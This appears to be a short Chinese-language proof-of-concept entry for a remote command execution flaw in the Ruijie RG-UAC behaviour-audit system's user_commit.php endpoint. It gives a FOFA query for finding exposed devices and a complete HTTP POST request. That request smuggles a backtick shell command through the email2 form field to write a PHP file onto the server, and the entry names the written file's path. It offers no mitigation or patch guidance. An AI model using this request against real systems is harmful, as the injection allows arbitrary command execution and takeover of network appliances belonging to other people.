## 锐捷RG-UAC统一上网行为管理审计系统user_commit.php存在远程代码执行

锐捷RG-UAC中存在命令执行漏洞，应用程序管理网关后端//view/systemConfig/sys_user/user_commit.php接口。攻击者可以执行任意命令来控制服务器权限。

## fofa

```
app="Ruijie-RG-UAC"
```

## poc

```
POST /view/systemConfig/sys_user/user_commit.php?action=add HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) 
Gecko/20100101 Firefox/124.0
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*
;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Connection: close
Cookie: PHPSESSID=ebd507c9bc5a4293c3e5e596f37157bf
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 0000:0000:0000::0000
X-Originating-IP: 0000:0000:0000::0000
X-Remote-IP: 0000:0000:0000::0000
X-Remote-Addr: 0000:0000:0000::0000
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

auth_method=1&pwd_policy=2&email2=`echo+"<?php+phpinfo();?>">1.php`&user_name=1
```

![image-20240526191201899](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405261912985.png)

文件路径` /view/systemConfig/sys_user/1.php`

![image-20240526191306904](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405261913960.png)